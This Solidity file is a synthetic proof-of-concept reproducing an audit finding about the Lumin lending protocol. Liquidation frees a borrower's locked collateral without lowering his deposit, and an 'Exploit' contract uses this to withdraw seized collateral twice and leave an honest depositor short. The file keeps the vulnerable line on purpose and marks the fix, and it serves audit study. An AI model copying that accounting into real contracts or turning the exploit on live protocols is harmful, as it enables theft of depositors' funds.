// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Lumin — [C-01] Collateral double-spend post liquidation is possible
    (Pashov Audit Group, 2023-09, finding #27233)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable AssetManager::assetTransferOnLoanAction Seize branch is
    inlined VERBATIM. No fork, no RPC, no cheatcodes.

    ROOT CAUSE (verbatim vulnerable lines, kept below):

        userDepositFrom.lockedAmount -= amount;
        userDepositTo.depositAmount += amount;

    On liquidation (the `Seize` action), the borrower's `lockedAmount` is
    decremented but `depositAmount` is NEVER decremented. Lumin's withdrawal
    gate only checks `depositAmount - lockedAmount`, so once `lockedAmount`
    drops back to 0 the borrower's full original `depositAmount` looks free
    again — even though that exact collateral was just paid out to the
    lender. The borrower can then withdraw it a SECOND time: a double-spend
    of already-liquidated collateral, financed out of other depositors'
    real token balance. The correct update also subtracts from
    `depositAmount`:

        userDepositFrom.lockedAmount -= amount;
        userDepositFrom.depositAmount -= amount;   // FIX (missing line)
        userDepositTo.depositAmount += amount;

    Numbers kept exact & simple (abstract units):
      - Carol (honest depositor) deposits 1000.
      - Bob (borrower) deposits 500 and locks it all as loan collateral.
      - Bob's loan is liquidated: 500 is seized and credited to Alice
        (the lender) — Bob's `lockedAmount` drops to 0 but his
        `depositAmount` STAYS at 500 (bug).
      - Alice withdraws her legitimately-paid 500.
      - Bob ALSO withdraws "his" 500 — a double-spend of collateral that
        was already paid to Alice.
      - Carol's honest 1000 claim now exceeds the AssetManager's real token
        balance by exactly 500 — she cannot be made whole.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 used as the underlying asset.
contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "ERC20: insufficient balance");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            require(allowance[from][msg.sender] >= amt, "ERC20: insufficient allowance");
            allowance[from][msg.sender] -= amt;
        }
        require(balanceOf[from] >= amt, "ERC20: insufficient balance");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduction of Lumin's AssetManager: per-user deposit/locked ledger
///         for a single asset, plus the liquidation seize path that carries
///         the bug. Loan-creation, borrowing, and multi-asset bookkeeping are
///         out of scope for this finding and are omitted.
contract AssetManager {
    enum AssetActionType {
        Seize
    } // Deposit/Withdraw/Repay branches omitted — not implicated in this bug

    struct UserDeposit {
        uint256 depositAmount;
        uint256 lockedAmount;
    }

    MockToken public token;
    mapping(address => UserDeposit) public depositOf;

    constructor(MockToken _token) {
        token = _token;
    }

    /// @notice Deposit `amount` underlying into the pool.
    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        depositOf[msg.sender].depositAmount += amount;
    }

    /// @notice Reduction of LoanManager::createLoan's collateral-locking
    ///         step: marks part of the caller's deposit as locked collateral
    ///         backing a loan.
    function lockCollateral(uint256 amount) external {
        UserDeposit storage d = depositOf[msg.sender];
        require(d.depositAmount - d.lockedAmount >= amount, "insufficient free collateral");
        d.lockedAmount += amount;
    }

    /// @notice Reduction of LoanManager::liquidate: once a loan has defaulted,
    ///         anyone can liquidate it, seizing the borrower's locked
    ///         collateral for the lender (matches the original PoC, where a
    ///         random unrelated address calls `liquidate`).
    function liquidate(address borrower, address lender, uint256 amount) external {
        assetTransferOnLoanAction(borrower, lender, amount, AssetActionType.Seize);
    }

    /// @notice Reduction of AssetManager::assetTransferOnLoanAction. Only the
    ///         `Seize` branch is modeled — the exact branch the finding
    ///         blames — with its two accounting lines preserved verbatim.
    function assetTransferOnLoanAction(address from, address to, uint256 amount, AssetActionType action) internal {
        UserDeposit storage userDepositFrom = depositOf[from];
        UserDeposit storage userDepositTo = depositOf[to];
        if (action == AssetActionType.Seize) {
            userDepositFrom.lockedAmount -= amount; // @> VULN: depositAmount is never decremented alongside lockedAmount
            // FIX: userDepositFrom.depositAmount -= amount;
            userDepositTo.depositAmount += amount;
        }
    }

    /// @notice Withdraw `amount` of the caller's free (unlocked) deposit.
    function withdraw(uint256 amount) external {
        UserDeposit storage d = depositOf[msg.sender];
        require(d.depositAmount - d.lockedAmount >= amount, "insufficient free balance");
        d.depositAmount -= amount;
        token.transfer(msg.sender, amount);
    }
}

/// @notice Thin actor contract so each participant (Bob/Alice/Carol) has its
///         own address and its own token/AssetManager balances — mirrors the
///         real protocol's multi-user accounting.
contract Depositor {
    MockToken public token;
    AssetManager public am;

    constructor(MockToken _token, AssetManager _am) {
        token = _token;
        am = _am;
    }

    function deposit(uint256 amount) external {
        token.mint(address(this), amount); // honest capital
        token.approve(address(am), amount);
        am.deposit(amount);
    }

    function lock(uint256 amount) external {
        am.lockCollateral(amount);
    }

    function withdraw(uint256 amount) external {
        am.withdraw(amount);
    }
}

/// @notice Attack orchestrator / deployer. Deploys the whole scene and runs
///         the collateral double-spend end-to-end, asserting the finding's
///         HARM with require().
contract Exploit {
    uint256 public constant CAROL_DEPOSIT = 1000;
    uint256 public constant BOB_DEPOSIT = 500;

    MockToken public token; // CREATE nonce 1
    AssetManager public am; // CREATE nonce 2
    Depositor public bob; // CREATE nonce 3 (borrower, double-spends his seized collateral)
    Depositor public alice; // CREATE nonce 4 (lender, legitimately paid on liquidation)
    Depositor public carol; // CREATE nonce 5 (honest depositor, the victim)

    uint256 public bobRecoveredAfterSeize;
    uint256 public poolBalanceAfterBobWithdraw;
    uint256 public carolClaim;

    constructor() {
        token = new MockToken();
        am = new AssetManager(token);
        bob = new Depositor(token, am);
        alice = new Depositor(token, am);
        carol = new Depositor(token, am);
    }

    function run() external {
        // 1. Carol deposits 1000 as an honest liquidity provider.
        carol.deposit(CAROL_DEPOSIT);

        // 2. Bob deposits 500 and locks it all as loan collateral.
        bob.deposit(BOB_DEPOSIT);
        bob.lock(BOB_DEPOSIT);

        // 3. Bob's loan defaults; anyone can liquidate it, seizing his
        //    collateral for Alice (the lender).
        am.liquidate(address(bob), address(alice), BOB_DEPOSIT);

        // ---- Bob's ledger still shows the seized 500 as free (the bug) ----
        (uint256 bobDeposit, uint256 bobLocked) = am.depositOf(address(bob));
        require(bobLocked == 0, "bob still locked");
        require(bobDeposit == BOB_DEPOSIT, "bob deposit wrongly decremented - bug not present");

        // 4. Alice withdraws the collateral she was legitimately paid.
        alice.withdraw(BOB_DEPOSIT);

        // 5. Bob ALSO withdraws "his" 500 — a double-spend of collateral that
        //    was already paid out to Alice.
        uint256 bobBalanceBefore = token.balanceOf(address(bob));
        bob.withdraw(BOB_DEPOSIT);
        bobRecoveredAfterSeize = token.balanceOf(address(bob)) - bobBalanceBefore;

        // ---- HARM: Bob recovers the exact seized amount a second time ----
        require(bobRecoveredAfterSeize == BOB_DEPOSIT, "bob did not double-spend his seized collateral");

        // 6. The pool is now insolvent: Carol's honest 1000 claim exceeds the
        //    AssetManager's real token balance by exactly the double-spent
        //    collateral — she cannot be made whole.
        poolBalanceAfterBobWithdraw = token.balanceOf(address(am));
        (carolClaim,) = am.depositOf(address(carol));
        require(carolClaim == CAROL_DEPOSIT, "carol claim changed");
        require(poolBalanceAfterBobWithdraw < carolClaim, "pool solvent for carol - bug not triggered");
        require(carolClaim - poolBalanceAfterBobWithdraw == BOB_DEPOSIT, "shortfall != double-spent collateral");
    }
}
